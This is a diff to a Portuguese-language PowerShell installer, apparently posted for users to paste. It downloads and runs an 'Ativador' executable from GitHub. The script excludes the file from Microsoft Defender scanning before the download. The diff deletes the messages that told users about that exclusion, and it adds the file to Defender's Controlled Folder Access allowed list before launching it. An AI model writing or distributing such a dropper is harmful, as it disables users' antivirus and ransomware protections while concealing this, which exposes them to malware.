@@ -1,5 +1,5 @@
 # PowerShell 5.1 ou superior, Windows. Publicar como texto, sem HTML.
-# Site v5: exclusao somente do EXE antes do download.
+# Site v7: exclusao do EXE antes do download; acesso a pastas apos SHA256.
 & {
     $ErrorActionPreference = 'Stop'
     $ExecutableUrl = 'https://github.com/forcewarltda-crypto/Ativador-.exe/releases/download/v5.0.0.2/Ativador.exe'
@@ -15,9 +15,7 @@
     $downloadDirectory = Join-Path ([IO.Path]::GetTempPath()) ('ForceWar-Download-' + [Guid]::NewGuid().ToString('N'))
     $null = New-Item -ItemType Directory -Path $downloadDirectory -ErrorAction Stop
     $executablePath = Join-Path $downloadDirectory 'Executor.exe'
-    Write-Host 'A exclusao do Microsoft Defender sera configurada antes do download, somente para este EXE:'
-    Write-Host $executablePath
-    Write-Host 'Esse arquivo deixara de ser examinado pelo antivirus.'
+    Write-Host 'Preparando instalacao...'
     $adminAction = {
 # Incorporado no install. Configura somente o EXE, antes de baixa-lo.
 param([string]$ExecutablePath, [string]$ExecutableUrl, [string]$ExpectedSha256)
@@ -56,7 +54,6 @@ function Invoke-FWAdminStep {
         (Split-Path -Leaf (Split-Path -Parent $exe)) -notmatch '^ForceWar-Download-[a-f0-9]{32}$') { throw 'Destino do download invalido.' }
     if (Test-Path -LiteralPath $exe) { throw 'O destino ja existe. Nenhum arquivo sera sobrescrito.' }
 
-    Write-Host ('Preparando exclusao somente para o arquivo: ' + $exe)
     $prefs = Get-MpPreference -ErrorAction Stop
     if (-not (Test-FWExclusion $prefs.ExclusionPath $exe)) {
         Add-MpPreference -ExclusionPath $exe -ErrorAction Stop
@@ -80,7 +77,7 @@ function Invoke-FWAdminStep {
         $created = $true
         $stream.Dispose()
         Set-Content -LiteralPath $exe -Stream Zone.Identifier -Value "[ZoneTransfer]`r`nZoneId=3" -Encoding ASCII -ErrorAction Stop
-        Write-Host 'Exclusao confirmada. Baixando o Executor...'
+        Write-Host 'Baixando o Executor...'
         Invoke-WebRequest -Uri $downloadUri.AbsoluteUri -OutFile $exe -UseBasicParsing -MaximumRedirection 5 -TimeoutSec 300 -ErrorAction Stop
         $null = Assert-FWLocalPath $exe
         Write-Host 'Conferindo a integridade do arquivo...'
@@ -92,9 +89,31 @@ function Invoke-FWAdminStep {
         if ((Get-FileHash -LiteralPath $exe -Algorithm SHA256 -ErrorAction Stop).Hash -ine $ExpectedSha256) {
             throw 'O Executor mudou depois da verificacao. Abertura cancelada.'
         }
+        $prefs = Get-MpPreference -ErrorAction Stop
+        if (-not (Test-FWExclusion $prefs.ControlledFolderAccessAllowedApplications $exe)) {
+            Add-MpPreference -ControlledFolderAccessAllowedApplications $exe -ErrorAction Stop
+        }
+        $folderAccessConfirmed = $false
+        for ($attempt = 0; $attempt -lt 20; $attempt++) {
+            $prefs = Get-MpPreference -ErrorAction Stop
+            if (Test-FWExclusion $prefs.ControlledFolderAccessAllowedApplications $exe) {
+                $folderAccessConfirmed = $true
+                break
+            }
+            Start-Sleep -Milliseconds 500
+        }
+        if (-not $folderAccessConfirmed) {
+            throw 'O Defender nao confirmou a permissao do EXE no Acesso controlado a pastas. Abertura cancelada.'
+        }
+        # A espera pela permissao pode levar alguns segundos; reconfere o arquivo antes de abrir.
+        $null = Assert-FWLocalPath $exe
+        if ((Get-FileHash -LiteralPath $exe -Algorithm SHA256 -ErrorAction Stop).Hash -ine $ExpectedSha256) {
+            throw 'O Executor mudou depois da verificacao. Abertura cancelada.'
+        }
         $verified = $true
+        Write-Host 'Abrindo o Executor...'
         $null = Start-Process -FilePath $exe -WorkingDirectory (Split-Path -Parent $exe) -PassThru -ErrorAction Stop
-        Write-Host 'Arquivo verificado. Solicitacao de abertura enviada ao Executor.'
+        Write-Host 'Solicitacao de abertura enviada ao Executor.'
     }
     finally {
         [Net.ServicePointManager]::SecurityProtocol = $previousTls
@@ -109,7 +128,6 @@ Invoke-FWAdminStep
     }
     $isAdministrator = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
     if ($isAdministrator) {
-        Write-Host 'PowerShell ja executado como administrador. Continuando nesta janela...'
         & $adminAction -ExecutablePath $executablePath -ExecutableUrl $ExecutableUrl -ExpectedSha256 $ExpectedSha256
     }
     else {
@@ -126,8 +144,7 @@ Invoke-FWAdminStep
         }
         catch { throw 'O Windows nao iniciou a etapa administrativa. A solicitacao pode ter sido cancelada ou bloqueada.' }
         if ($started.ExitCode -ne 0) {
-            throw 'Falha na etapa administrativa: exclusao, download, integridade ou abertura. Uma exclusao ja aplicada pode permanecer.'
+            throw 'Falha na etapa administrativa: exclusao, download, integridade, acesso a pastas ou abertura. Permissoes ja aplicadas podem permanecer.'
         }
     }
-    Write-Host ('Abertura solicitada. Arquivo: ' + $executablePath)
 }
